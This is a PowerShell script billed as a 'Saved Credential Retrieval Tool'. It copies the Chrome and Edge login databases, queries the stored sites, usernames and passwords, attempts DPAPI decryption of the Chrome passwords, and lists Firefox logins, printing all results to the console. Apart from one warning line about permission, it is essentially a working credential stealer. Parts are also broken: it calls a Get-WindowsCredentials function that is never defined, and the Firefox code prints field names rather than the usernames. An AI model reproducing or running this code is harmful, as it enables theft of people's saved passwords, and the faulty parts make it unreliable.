function Get-ChromeCredentials {
    <#
    .SYNOPSIS
        Retrieves saved credentials from Chrome browser
    #>
    
    Write-Host "`n=== Chrome Browser Credentials ===`n" -ForegroundColor Yellow
    
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        
        if (-not (Test-Path $chromePath)) {
            Write-Host "Chrome credentials database not found" -ForegroundColor Cyan
            return
        }

        # Chrome stores passwords in SQLite database
        $tempCopy = "$env:TEMP\chrome_creds.db"
        Copy-Item $chromePath -Destination $tempCopy -Force -ErrorAction Stop

        # Load SQLite assembly
        try {
            Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "SQLite assembly not found. Download from https://system.data.sqlite.org/" -ForegroundColor Red
            return
        }

        $connectionString = "Data Source=$tempCopy;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection $connectionString
        $connection.Open()

        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $command = $connection.CreateCommand()
        $command.CommandText = $query

        $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter $command
        $dataset = New-Object System.Data.DataSet
        $adapter.Fill($dataset) | Out-Null

        $table = $dataset.Tables[0]

        if ($table.Rows.Count -eq 0) {
            Write-Host "No saved credentials found in Chrome" -ForegroundColor Cyan
            return
        }

        foreach ($row in $table.Rows) {
            $url = $row.origin_url
            $user = $row.username_value
            $encrypted = $row.password_value
            
            # Simple decryption (may not work on all systems)
            try {
                $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect(
                    $encrypted[0..($encrypted.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            }
            catch {
                $password = "[Could not decrypt - requires current user context]"
            }

            Write-Host "URL: $url" -ForegroundColor Green
            Write-Host "Username: $user" -ForegroundColor Cyan
            Write-Host "Password: $password`n" -ForegroundColor Magenta
        }

        $connection.Close()
        Remove-Item $tempCopy -Force
    }
    catch {
        Write-Host "Error accessing Chrome credentials: $_" -ForegroundColor Red
    }
}

function Get-FirefoxCredentials {
    <#
    .SYNOPSIS
        Retrieves saved credentials from Firefox browser
    .NOTES
        Requires Firefox's nss3.dll and knowing the master password if one is set
    #>
    
    Write-Host "`n=== Firefox Browser Credentials ===`n" -ForegroundColor Yellow
    
    try {
        $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles\"
        
        if (-not (Test-Path $firefoxProfiles)) {
            Write-Host "Firefox profiles not found" -ForegroundColor Cyan
            return
        }

        $profile = Get-ChildItem $firefoxProfiles -Directory | Where-Object { $_.Name -match "\.default-release$" } | Select-Object -First 1
        
        if (-not $profile) {
            Write-Host "No default Firefox profile found" -ForegroundColor Cyan
            return
        }

        $loginsPath = Join-Path $profile.FullName "logins.json"
        
        if (-not (Test-Path $loginsPath)) {
            Write-Host "Firefox credentials file not found" -ForegroundColor Cyan
            return
        }

        $json = Get-Content $loginsPath | ConvertFrom-Json
        
        if (-not $json.logins) {
            Write-Host "No saved credentials found in Firefox" -ForegroundColor Cyan
            return
        }

        Write-Host "Firefox stores passwords encrypted. To decrypt you need:" -ForegroundColor Yellow
        Write-Host "1. nss3.dll from Firefox installation" -ForegroundColor Yellow
        Write-Host "2. The master password if one is set" -ForegroundColor Yellow
        Write-Host "`nFound the following credentials (encrypted):`n" -ForegroundColor Yellow

        foreach ($login in $json.logins) {
            Write-Host "URL: $($login.hostname)" -ForegroundColor Green
            Write-Host "Username: $($login.usernameField)`n" -ForegroundColor Cyan
        }
    }
    catch {
        Write-Host "Error accessing Firefox credentials: $_" -ForegroundColor Red
    }
}

function Get-EdgeCredentials {
    <#
    .SYNOPSIS
        Retrieves saved credentials from Edge browser
    #>
    
    Write-Host "`n=== Edge Browser Credentials ===`n" -ForegroundColor Yellow
    
    try {
        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        
        if (-not (Test-Path $edgePath)) {
            Write-Host "Edge credentials database not found" -ForegroundColor Cyan
            return
        }

        # Edge uses same storage as Chrome
        $tempCopy = "$env:TEMP\edge_creds.db"
        Copy-Item $edgePath -Destination $tempCopy -Force -ErrorAction Stop

        try {
            Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "SQLite assembly not found. Download from https://system.data.sqlite.org/" -ForegroundColor Red
            return
        }

        $connectionString = "Data Source=$tempCopy;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection $connectionString
        $connection.Open()

        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $command = $connection.CreateCommand()
        $command.CommandText = $query

        $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter $command
        $dataset = New-Object System.Data.DataSet
        $adapter.Fill($dataset) | Out-Null

        $table = $dataset.Tables[0]

        if ($table.Rows.Count -eq 0) {
            Write-Host "No saved credentials found in Edge" -ForegroundColor Cyan
            return
        }

        foreach ($row in $table.Rows) {
            $url = $row.origin_url
            $user = $row.username_value
            
            Write-Host "URL: $url" -ForegroundColor Green
            Write-Host "Username: $user" -ForegroundColor Cyan
            Write-Host "Password: [Encrypted - requires decryption]`n" -ForegroundColor Magenta
        }

        $connection.Close()
        Remove-Item $tempCopy -Force
    }
    catch {
        Write-Host "Error accessing Edge credentials: $_" -ForegroundColor Red
    }
}

# Main execution
Write-Host "`n=== Saved Credential Retrieval Tool ===`n" -ForegroundColor Yellow
Write-Host "This script attempts to retrieve saved credentials from browsers and Windows" -ForegroundColor Cyan
Write-Host "`nWARNING: Use only on systems you own or have permission to test!`n" -ForegroundColor Red

Get-WindowsCredentials
Get-ChromeCredentials
Get-EdgeCredentials
Get-FirefoxCredentials

Write-Host "`n=== Scan Complete ===`n" -ForegroundColor Yellow
